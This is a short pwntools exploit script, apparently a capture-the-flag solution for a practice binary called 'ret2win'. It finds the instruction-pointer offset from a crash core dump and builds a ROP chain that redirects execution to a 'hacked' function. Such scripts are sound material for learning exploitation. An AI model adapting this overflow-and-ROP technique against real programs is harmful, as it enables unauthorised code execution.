from pwn import *

exe = './ret2win'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

target = process('./ret2win')
payload = cyclic(50)
target.sendlineafter(b'Name:', payload)
target.wait()

core = target.corefile

eip_value = core.eip
eip_offset = cyclic_find(eip_value)
info('located EIP offset at {a}'.format(a=eip_offset))

rop = ROP(elf)
rop.hacked()

print(rop.dump())

rop_chain = rop.chain()

payload = flat({
    eip_offset: rop_chain
    })

write('payload', payload)

target = process('./ret2win')

target.sendlineafter(b'Name:', payload)

target.interactive()
